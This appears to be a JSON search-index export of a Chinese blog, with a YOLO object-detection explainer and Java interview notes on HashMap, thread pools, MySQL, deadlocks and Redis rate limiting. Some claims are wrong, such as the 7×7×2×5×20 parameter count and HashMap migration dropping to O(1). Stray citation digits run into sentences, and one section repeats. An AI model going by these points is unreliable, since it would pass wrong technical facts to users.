[{"categories":["深度学习"],"content":"算法概述 YOLO（You Only Look Once）系列的首个版本由 Joseph Redmon 等人于 2015 年开创性提出。其核心设计目标在于将复杂的目标检测流程简化为单次回归问题，依托一个端到端的卷积神经网络（CNN）架构，直接对输入图像中的目标边界框与类别进行精准预测。简而言之，YOLO 致力于教会计算机系统如何高效识别图像中的各类物体，诸如常见的猫、狗、苹果、汽车等，并且能够精确确定这些物体在图像中的具体位置，摆脱传统方法的盲目性与不确定性。 ","date":"2025-06-12","objectID":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/:1:0","tags":[],"title":"基于yolo算法的目标识别与检测","uri":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["深度学习"],"content":"YOLO 算法核心流程 ","date":"2025-06-12","objectID":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/:2:0","tags":[],"title":"基于yolo算法的目标识别与检测","uri":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["深度学习"],"content":"（一）预测阶段上：类别与框的初始生成 当一幅全新的图像输入至已训练完备的 YOLO 模型时，模型首先将图像均匀划分为 7×7 共计 49 个小方格，在专业术语体系中被称为 grid cell。每个 grid cell 肩负两项关键任务：其一，负责生成两个以该 grid cell 为中心的预测边界框（bounding box，简称 bbox），这两个 bbox 通过 x、y、w、h、c 五个参数予以精准界定，其中（x，y）代表预测框中心点的坐标，（w，h）表示框的宽度与高度，而 c 则用于表征该框的可信度（confidence）；其二，对该 grid cell 所处区域内可能存在的物体类别进行预测，物体类别的具体数量与训练所采用的数据集密切相关，在 YOLO 算法的原始论文中，其数据集涵盖 20 种不同物体类别。基于上述流程，在此阶段，模型共计会生成 7×7×2 个 bbox，相应的参数数量高达 7×7×2×5×20 个。后续通过一系列精细的后处理操作，旨在筛选并保留针对不同物体识别效果最佳的边界框。 ","date":"2025-06-12","objectID":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/:2:1","tags":[],"title":"基于yolo算法的目标识别与检测","uri":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["深度学习"],"content":"（二）预测阶段下：边界框的筛选与保留 在前述步骤生成众多边界框之后，如何从中筛选出最为精准、可靠的边界框成为关键环节。聚焦于某一特定的 grid cell，以落在图像中汽车位置的 grid cell 为例，由于其与汽车位置高度重合，所生成的较大边界框因能更精准框选汽车，其置信度显著高于小框，这一置信度差异在可视化呈现中可通过线条粗细程度予以直观反映。同理，对于未包含任何物体的 grid cell，无论其将该区域判定为何种物体类别，其置信度均处于较低水平，对应边界框线条较细。 进一步地，针对图像中所有 grid cell 生成的共计 98 个 bbox，采取置信度分数低分数过滤策略，将置信度过低的 bbox 直接置零，此举旨在大幅提升运算效率。随后，运用非极大值抑制（NMS）算法对剩余 bbox 进行深度筛选。 NMS 算法的核心思想在于保留相近区域内得分最高的 bbox，而非单纯追求全图得分最高，这是考虑到图像中可能存在多个同类物体的实际情况。具体而言，在 NMS 算法执行过程中，首先对 bbox 依据置信度进行降序排序，以 1、2、3、4 分别标记置信度从高到低的四个 bbox 为例：第一轮比较时，将 1 与其他所有 bbox 逐一对比，若 1 与 2 的交并比（IOU）过大，表明二者极有可能是对同一物体的重复框选，此时保留得分最高的 1，将 2 置零；若 1 与 3 的 IOU 较小，则保留两者；依此类推完成第一轮比较。第二轮从剩余未被置零的 bbox 中选取起始点，如从 3 开始，重复上述比较过程，直至所有 bbox 均完成比较。最终，经过 NMS 算法处理后，仅保留少数得分最高且互不重叠过多的边界框，实现精准的目标定位。 ","date":"2025-06-12","objectID":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/:2:2","tags":[],"title":"基于yolo算法的目标识别与检测","uri":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["深度学习"],"content":"（三）训练阶段：模型的学习与优化 数据输入与标注： 训练 YOLO 模型的首要步骤是构建规模庞大且标注精准的数据集，将成千上万张已精心标注物体类别及位置信息的图像输入至模型 f。对于每一张输入图像 X，其附带详细的物体标注信息，例如图像中存在汽车、苹果等物体的具体位置与类别标签，以此完成模型的初步知识传授。 损失函数构建： 在模型接收输入图像并输出其预测结果 f (X) 后，需要与预先标注的真实结果 y 进行比对。为促使模型的预测结果无限趋近于真实标签，即达成 f (X) → y 的优化目标，构建科学合理的损失函数至关重要。 在 YOLO 算法的原始设计中，损失函数 loss 综合考量多个关键因素，具体包括：生成的 bbox 中心点定位误差，反映预测框中心位置与真实框中心的偏差程度；生成的 bbox 宽高定位误差，衡量框的大小预测准确性；该 grid cell 包含有物体时的置信度误差，确保对存在物体区域的置信度预测精准；该 grid cell 不含有物体时的置信度误差，避免对空区域的误判；以及该 grid cell 的分类误差，保障物体类别预测的正确性。通过对这些误差项的加权求和，构建出完整的损失函数，以量化模型预测结果与真实标签之间的差异。 模型迭代优化： 重复进行上述训练过程，历经多轮迭代训练，持续监测损失函数值的变化趋势。随着训练轮次的递增，损失函数值逐步趋于稳定，表明模型在不断学习与优化过程中，逐渐掌握目标识别与检测的核心规律，提升预测准确性与稳定性。 https://www.ultralytics.com/ ","date":"2025-06-12","objectID":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/:2:3","tags":[],"title":"基于yolo算法的目标识别与检测","uri":"/posts/%E5%9F%BA%E4%BA%8Eyolo%E7%AE%97%E6%B3%95%E7%9A%84%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["java面试"],"content":"京东零售-Java ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"具体说说jdk1.7和1.8的hashmap的线程不安全都有什么问题 JDK 1.7 HashMap的线程不安全问题 在JDK 1.7中，HashMap的线程不安全问题主要体现在扩容过程中。当HashMap进行扩容时，如果多个线程同时操作同一个HashMap，可能会导致以下问题： 死循环： 当HashMap触发扩容时，如果两个线程A和B同时操作同一个链表，线程A可能在执行扩容函数transfer的过程中被挂起，而线程B则可能在此期间完成数据迁移。 当线程A恢复执行时，由于链表结构已经在线程B的操作下发生改变，线程A可能会按照旧的链表结构进行插入操作，从而导致链表形成环形结构。 这种环形链表结构会导致在后续访问HashMap时出现死循环。 数据丢失： 在扩容过程中，如果链表形成环形结构，可能会导致某些元素在扩容后无法被正确访问，从而造成数据丢失。 此外，由于扩容操作涉及多个步骤和状态变化，如果线程在扩容过程中被中断或挂起，也可能导致数据不一致或丢失。 JDK 1.8 HashMap的线程不安全问题 在JDK 1.8中，HashMap对底层数据结构进行了优化，引入了红黑树来优化链表过长的问题。然而，线程不安全问题仍然存在，但表现形式有所不同： 数据覆盖： 当多个线程同时执行put操作时，如果两个线程插入的键值对的哈希值相同（即发生哈希碰撞），则可能会导致数据覆盖。 具体来说，如果一个线程A在判断哈希值位置为null后还未写入数据时被挂起，而另一个线程B在该位置插入了数据并成功完成put操作，那么当线程A恢复执行并尝试写入数据时，就会覆盖线程B已经插入的数据。 size字段不一致： HashMap中的size字段用于记录当前存储的键值对数量。在多线程环境下，多个线程同时操作put方法可能会导致size值不一致。 例如，两个线程同时增加size的值，可能会导致size的值大于实际存储的键值对数量，进而引发数据覆盖或其他不一致问题。 解决方案 为了避免HashMap的线程不安全问题，可以采取以下解决方案： 使用Collections.synchronizedMap： 将HashMap包装成线程安全的Map。这通过在HashMap的所有方法上添加synchronized关键字来实现线程同步。 使用ConcurrentHashMap： ConcurrentHashMap是JDK提供的线程安全的HashMap实现。它采用分段锁或局部锁等机制来降低锁粒度，提高并发性能。 手动加锁： 在使用HashMap的地方手动加锁。这可以通过使用synchronized关键字或其他同步机制来保护共享资源。 ​ 综上所述，JDK 1.7和JDK 1.8中的HashMap都存在线程不安全问题。在JDK 1.7中，问题主要体现在扩容过程中的死循环和数据丢失；而在JDK 1.8中，问题则主要表现为数据覆盖和size字段不一致。为了避免这些问题，可以使用线程安全的替代方案如ConcurrentHashMap或采取手动加锁等措施。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:1","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"hashmap链表转化成红黑树的过程以及红黑树转化成链表的过程 链表转化成红黑树的过程 链表长度阈值：当单个桶中的链表长度达到8时，该链表会被转换为红黑树。 最小树化容量：HashMap的总容量（桶数组大小）必须至少为64。如果容量小于64，即使链表长度达到8，也不会进行树化，而是会选择扩容。 红黑树转化成链表 树形化的红黑树节点数量小于6：当红黑树节点的数量减少到6或更少时，红黑树会被转换回链表。这是因为在少量节点的情况下，链表的插入和删除操作比红黑树更高效。 最小树化容量：这是一个辅助条件，用于确保只有在HashMap的容量（桶数组大小）足够大时，才会执行链表到红黑树的转换和反转换。默认情况下，这个值是64。但是，转回链表的主要依据还是节点数量。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:2","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"hashmap扩容机制原理 扩容原理 当HashMap中的元素数量超过容量与加载因子的乘积时，HashMap会进行扩容。扩容是通过创建一个新的Node数组，其容量是原数组的两倍，然后将原数组中的所有元素重新散列到新数组中。 在JDK1.7和JDK1.8中，HashMap的扩容机制有所不同。在JDK1.7中，扩容涉及重新计算每个元素的存储位置，并使用头插法将链表中的元素逆序插入到新数组中。这种方法可能会导致链表中的环形结构，在多线程环境下可能会引起死循环。 而在JDK1.8中，扩容过程中使用了尾插法，保持了链表的顺序，减少了环形链表的风险。此外，JDK1.8引入了红黑树，当链表长度超过一定阈值（默认为8）时，链表会转换为红黑树，以提高搜索效率。 扩容过程 当HashMap中的元素数量超过容量与加载因子的乘积时，HashMap会进行扩容。扩容是通过创建一个新的Node数组，其容量是原数组的两倍，然后将原数组中的所有元素重新散列到新数组中。 在JDK1.7和JDK1.8中，HashMap的扩容机制有所不同。在JDK1.7中，扩容涉及重新计算每个元素的存储位置，并使用头插法将链表中的元素逆序插入到新数组中。这种方法可能会导致链表中的环形结构，在多线程环境下可能会引起死循环。 而在JDK1.8中，扩容过程中使用了尾插法，保持了链表的顺序，减少了环形链表的风险。此外，JDK1.8引入了红黑树，当链表长度超过一定阈值（默认为8）时，链表会转换为红黑树，以提高搜索效率。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:3","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"线程创建和cpu交互过程，线程的状态 线程的创建和CPU交互过程主要包括以下几个步骤： ‌创建线程对象‌：可以通过继承Thread类或实现Runnable接口来创建线程对象。继承Thread类时，需要重写run()方法；实现Runnable接口时，需要实现run()方法，并通过Thread类的构造方法创建线程对象‌12。 ‌调用start()方法‌：通过调用线程对象的start()方法，线程进入就绪状态，等待CPU调度。start()方法会启动新线程，并调用run()方法‌12。 ‌CPU调度‌：当线程获得CPU时间片时，线程进入运行状态，开始执行其任务。如果线程执行完毕或时间片用完，线程会回到就绪状态，等待下一次调度‌34。 ‌状态转换‌：线程的状态包括新建、就绪、运行、阻塞和终止。状态之间的转换如下： ‌新建‌：线程被创建但未启动。 ‌就绪‌：已启动，等待CPU调度。 ‌运行‌：正在CPU执行。 ‌阻塞‌：等待I/O完成、锁释放或其他条件满足。 ‌终止‌：执行完毕或异常退出‌34。 ‌线程的状态及其定义‌： ‌**新建(New)**‌：线程被创建但未启动。 ‌**就绪(Runnable)**‌：已启动，等待CPU调度。 ‌**运行(Running)**‌：正在CPU执行。 ‌**阻塞(Blocked/Waiting)**‌：等待I/O完成、锁释放或其他条件满足。 ‌**终止(Terminated)**‌：执行完毕或异常退出‌34。 通过这些步骤和状态转换，线程与CPU进行有效的交互，完成任务的执行。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:4","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"线程池参数怎么设置的，为什么 ‌**核心线程数（corePoolSize）**‌：核心线程数是指线程池中常驻的线程数量。对于CPU密集型任务，核心线程数通常设置为CPU核心数+1，因为计算过程中CPU一直处于高负载状态，过多的线程会导致线程上下文切换，降低性能。对于IO密集型任务，核心线程数可以设置为CPU核心数的2倍或更多，因为线程在I/O操作期间会被阻塞，需要更多的线程来提高CPU利用率‌12。 ‌**最大线程数（maximumPoolSize）**‌：最大线程数是线程池允许创建的最大线程数量。当任务队列已满且核心线程数已达到最大值时，线程池会创建新的线程直到达到最大线程数。最大线程数的设置需要根据业务需求和服务器资源来综合考虑‌13。 ‌**任务队列（workQueue）**‌：任务队列用于存放待执行的任务。对于需要快速响应的应用，可以使用无界队列（如LinkedBlockingQueue）来避免任务积压导致的延迟；对于需要控制并发数的应用，可以使用有界队列（如ArrayBlockingQueue）来限制队列长度，避免内存溢出‌23。 ‌**线程空闲存活时间（keepAliveTime）**‌：当线程池中的线程数量超过核心线程数时，多余的空闲线程在等待新任务到来之前会保持存活一段时间。这段时间过后，线程会被终止。设置合理的空闲存活时间可以减少资源浪费‌3。 ‌**拒绝策略（RejectedExecutionHandler）**‌：当线程池已满且任务队列也已满时，新任务会被拒绝。常见的拒绝策略包括： ‌AbortPolicy‌：直接抛出异常，终止任务。 ‌CallerRunsPolicy‌：在新任务所在的线程中直接执行任务。 ‌DiscardPolicy‌：默默丢弃任务，不作处理。 ‌DiscardOldestPolicy‌：丢弃队列中最老的未处理任务，然后提交当前任务‌3。 ‌设置这些参数的原因‌是为了优化系统性能和资源利用： ‌核心线程数和最大线程数的合理设置‌可以避免过多的线程创建和销毁，减少系统开销，提高系统稳定性。 ‌任务队列的选择‌可以根据业务需求控制任务的积压情况，避免因任务积压导致的系统延迟。 ‌拒绝策略的选择‌可以在系统过载时提供合理的错误处理机制，避免系统崩溃。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:5","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"mysql insert语句执行过程中 索引的变化 在MySQL数据库中，插入（INSERT）数据时，索引的变化主要体现在两个方面：一是插入操作的效率，二是索引对查询性能的影响。理解这些变化有助于优化数据库性能和查询效率。 1. 插入操作对索引的影响 当你在MySQL中插入数据时，如果表中存在索引（尤其是主键或唯一索引），MySQL需要确保新插入的数据不会违反索引的唯一性约束。这通常涉及以下几个步骤： 查找位置：对于有索引的列，MySQL会先查找该列的索引来确定插入点的位置。 维护索引：在找到插入位置后，MySQL需要更新索引以反映新的数据位置。对于非聚集索引（secondary indexes），这意味着更新索引页中的指针或值。 写入数据：数据被写入数据页，然后是更新索引页。 2. 性能影响 插入速度：对于聚集索引（通常是主键），插入操作相对较快，因为数据和索引是物理上连续存储的。但对于非聚集索引，每次插入都需要更新索引页，这可能会稍微减慢插入速度。 空间使用：频繁的插入操作可能会导致索引页分裂，特别是在使用B-Tree索引时。这会增加磁盘I/O操作，因为需要读取、修改和写入多个页。 碎片化：随着数据的不断插入和删除，索引可能会变得碎片化，这会影响查询性能。定期的优化操作（如OPTIMIZE TABLE）可以帮助减少碎片化。 3. 优化策略 批量插入：尽可能使用批量插入（例如INSERT INTO table_name VALUES (...), (...), ...;）来减少磁盘I/O操作和提高效率。 选择合适的索引：只在确实需要提高查询性能的列上创建索引。避免在经常更新的列上创建过多的索引，因为这会增加写操作的开销。 定期维护：定期使用OPTIMIZE TABLE来减少碎片化，特别是在高更新频率的表上。 考虑分区：对于非常大的表，考虑使用分区来管理数据，这可以帮助提高查询和维护操作的效率。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:6","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"两个时间段，通过排序剪枝判断是否有重叠的部分 首先，将所有时间段按照开始时间从小到大进行排序。然后，遍历排序后的时间段列表，对于当前时间段，检查其结束时间是否大于前一个时间段的开始时间。如果存在这样的情况，说明当前时间段与前一个时间段有重叠。具体步骤如下： ‌排序‌：将所有时间段按照开始时间从小到大进行排序。 ‌遍历‌：从第一个时间段开始，逐个检查后续时间段。 ‌剪枝‌：如果当前时间段的开始时间小于等于前一个时间段的结束时间，说明有重叠，返回重叠状态。 ‌无重叠‌：如果遍历完所有时间段都没有发现重叠，则说明没有重叠。 这种方法利用了排序后的时间段列表中，相邻时间段可能重叠的特性，通过剪枝（即提前终止检查）来优化性能。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:7","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"字节番茄小说-Java ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"数据库底层死锁的原因 数据库底层死锁的主要原因‌包括以下四个必要条件： 互斥条件‌：资源必须以独占模式被访问，即一次只能被一个进程或线程占用‌ ‌持有并等待条件‌：一个进程持有至少一个资源的同时，等待获取其他资源，而不释放已持有的资源‌ 不可剥夺条件‌：已分配给进程的资源不能被强制回收，只能由持有资源的进程主动释放‌ 循环等待条件‌：存在一个进程资源的申请序列，使得每个进程都在等待下一个进程所持有的资源，形成循环等待的环路‌ 死锁的检测和解决策略 数据库管理系统提供了多种策略来检测和解决死锁： 自动检测并回滚事务‌：当检测到死锁时，系统会自动选择一个事务进行回滚，以解除死锁状态‌ 预防策略‌：通过设定事务的锁顺序、避免长时间的事务、限制事务的并发数量等，以减少死锁发生的可能性‌ ‌检测和解决策略‌：一旦系统检测到死锁发生，会立即采取措施，如中断一个或多个事务的执行，释放其锁定的资源，从而打破死锁状态‌ ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:1","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"redis限流为什么使用lua？ 为什么不用指令？ 性能和原子性： Lua脚本可以在Redis服务器端原子性地执行多个命令，避免了多次网络通信的开销，提高了性能和原子性。相比之下，用Java或Python实现的限流算法需要多次与Redis进行通信，性能相对较低。 便捷性： Lua脚本可以直接在Redis服务器端执行，无需额外部署其他语言的运行环境，更加灵活和便捷。 Redis支持： Redis天然支持Lua脚本，可以直接执行，不需要额外的配置和插件。而如果使用Java或Python，需要额外的库或框架来与Redis进行交互。 local key = KEYS[1] -- 获取传入lua脚本的第一个keys参数，用作存储令牌数目的键名 local limit = tonumber(ARGV[1]) -- 将传入lua脚本的第一个ARGV参数转换为整数，表示桶的容量 local current = tonumber(redis.call('get', key) or \"0\") -- 通过Redis的GET命令获取当前令牌桶中的令牌数量，如果没有获取到则默认为0，并将其转换为整数。 if current + 1 \u003e limit then -- 判断当前令牌桶中的令牌数量加1后是否超过阈值 return 0 -- 超过表示请求被限流，返回0 else redis.call('INCR', key) -- 通过Redis的INCR命令将令牌桶中的数量加1，表示通过了一个请求 redis.call('EXPIRE', key, ARGV[2]) -- 设置令牌桶的过期时间为ARGV 参数中指定的时间 return 1 -- 返回1，表示通过限流检查 end ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:2","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"redis 是计算密集还是cpu密集，为什么？ Redis 主要是 CPU密集型 ，而不是 IO密集型 ‌。Redis的操作本质上是CPU密集型，而不是IO密集型。这是因为Redis在网络IO上使用 epoll 实现了一个IO多路复用的 reactor模型 ，epoll是非阻塞IO，避免了CPU阻塞在IO上，因此Redis的瓶颈不在于等待IO导致CPU利用率不高，不需要多个线程来屏蔽等待IO执行完成的时间‌。 Redis的架构特点 ‌单线程架构‌：Redis采用单线程架构，避免了线程切换带来的开销。单线程处理减少了线程争用带来的缓存失效问题，避免了频繁的缓存刷新，从而提升了性能‌。 ‌IO多路复用‌：Redis使用epoll等机制实现非阻塞IO，使得单线程在面对多个客户端连接时仍能保持高效处理‌。 ‌数据结构和操作‌：Redis支持丰富的数据结构，如string、list、hash、set、zset等。这些数据结构的时间复杂度较高时，可能会导致CPU占用大量时间进行运算，从而表现出CPU密集型的特性‌ ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:3","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"redis多路复用原理和多线程的区别 Redis的多路复用（I/O Multiplexing）和多线程（Multi-threading）是两种不同的并发处理机制，它们在Redis中扮演着互补但独立的角色，主要区别如下： 🔄 一、多路复用原理（I/O Multiplexing） ‌核心目标‌ 解决单线程下‌高并发连接‌的问题，用单个线程同时监听并处理多个客户端请求36。 ‌工作原理‌ 通过系统调用（如epoll、select）监控多个网络连接的读写事件（如READ/WRITE事件）36。 当某个连接有数据可读/写时，操作系统通知Redis主线程处理对应事件（如读取请求、发送响应），避免线程阻塞等待I/O910。 ‌所有命令执行‌仍由单线程顺序处理，保证原子性15。 ‌优势‌ 减少线程切换开销，避免多线程锁竞争511。 高效管理数万并发连接（如epoll时间复杂度O(1)）69。 ⚙️ 二、多线程机制（Redis 6.0+） ‌引入目的‌ 解决‌网络I/O吞吐瓶颈‌（尤其是大流量场景），将耗时的网络读写任务并行化24。 ‌分工设计‌ ‌主线程‌：单线程执行命令逻辑（保证原子性）并分配I/O任务411。 ‌I/O线程组‌：负责socket读写（数据从内核态→用户态拷贝）、请求解析与响应发送12。 ‌后台线程‌：处理异步任务（如持久化、大Key删除）47。 ‌工作流程‌ 客户端请求 → 主线程通过多路复用接收 → 解析后的请求分发给I/O线程并行读写 → 主线程执行命令 → I/O线程发送响应412。 🔍 三、核心区别总结 ‌特性‌ ‌多路复用‌ ‌多线程‌ ‌作用层面‌ 网络连接管理（事件驱动）36 网络I/O任务并行化24 ‌线程模型‌ 单线程监听事件 主线程 + I/O工作线程组 ‌关键目标‌ 高并发连接处理 提升网络吞吐量 ‌数据安全性‌ 命令执行天然原子性512 命令仍由主线程串行执行，保持原子性1112 ‌版本依赖‌ 所有版本核心机制 Redis 6.0+ 引入411 💎 四、协同关系 ‌多路复用是基础‌：主线程通过多路复用监听连接事件，再决定是否启用I/O线程处理网络数据112。 ‌多线程是优化‌：针对网络I/O的瓶颈（如大流量下的数据拷贝耗时），通过多线程加速，但‌不改变命令执行的单线程本质‌411。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:4","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"实现concurhashmap 自己写乐观锁和悲观锁怎么实现 cas是怎么实现的 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:5","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"hashMap扩容的过程 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:6","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"hashmap 扩容为什么是两倍 HashMap 扩容时容量加倍（如 16 → 32）的设计核心在于 ‌利用位运算优化性能、保证哈希分布均匀及提升扩容效率‌，具体原因如下： 🔍 一、核心原因：优化索引计算与性能 ‌位运算取代取模，提升计算效率‌ HashMap 通过 (n-1) \u0026 hash 计算索引（n 为数组长度），而非传统的 hash % n。 ‌**当 n 是 2 的幂次方时（如 16=10000），n-1 的二进制为全 1（如 15=1111）**‌。 此时 (n-1) \u0026 hash 等价于 hash % n，但位运算（\u0026）比取模（%）快 10 倍以上。 ‌扩容为 2 倍能保证新容量仍是 2 的幂次方‌，延续位运算优势。 ‌示例‌： textCopy Code原容量 n=16 (二进制 10000), n-1=15 (1111) hash=27 (二进制 11011) → 27 \u0026 15 = 1011 (即索引 11) 扩容后 n=32 (100000), n-1=31 (11111) → 27 \u0026 31 = 11011 (仍为 27，但实际索引需根据高位判断) ⚙️ 二、减少哈希冲突，均匀分布元素 ‌哈希分布更均匀 当 n 为 2 的幂次方时，n-1 的二进制全 1 特性使得哈希值的低位能均匀映射到数组各位置。 若容量非 2 的幂次方（如 15=1110），部分索引永远无法被映射（如末位为 1 的位置），导致哈希冲突概率增加。 🚀 三、优化扩容时元素迁移效率（JDK 1.8+） ‌元素新位置只需一次位判断‌ 扩容后（newCap = oldCap « 1），元素的新位置仅有两种可能： ‌原位不变‌（如原索引 13 → 新索引 13） ‌原位 + 原容量‌（如原索引 13 → 新索引 13+16=29）。 ‌判断逻辑：检查哈希值新增的高位是 0 还是 1（即hash \u0026 oldCap）： =0 → 索引不变 =1 → 索引 = 原索引 + oldCap。 ‌优势‌ ‌无需重新计算哈希值‌，迁移时间复杂度从 O(n) 降至 O(1)。 只需遍历旧数组，按高位判断即可将元素拆分到新数组的两个位置。 💎 四、为何不采用 1.5 倍或 2.5 倍？ ‌失去位运算优化基础 若扩容 1.5 倍（如 16→24），新容量不再是 2 的幂次方，无法用 (n-1) \u0026 hash 替代取模，性能下降。 ‌元素迁移效率降低 非 2 倍扩容时，元素需重新计算哈希值并分配位置，迁移成本显著增加。 📊 关键优势总结 ‌特性‌ ‌扩容 2 倍的优势‌ ‌非 2 倍扩容的问题‌ ‌索引计算‌ 位运算 \u0026 替代取模 %，效率更高 依赖低速取模运算 ‌哈希分布‌ n-1 全 1 保障均匀映射 部分索引空缺，冲突概率增加 ‌扩容迁移效率‌ 高位判断即可确定新位置，O(1) 复杂度 需重算哈希值，O(n) 复杂度 ‌容量对齐‌ 始终维持 2 的幂次方特性 破坏幂次方特性，后续操作效率降低 💡 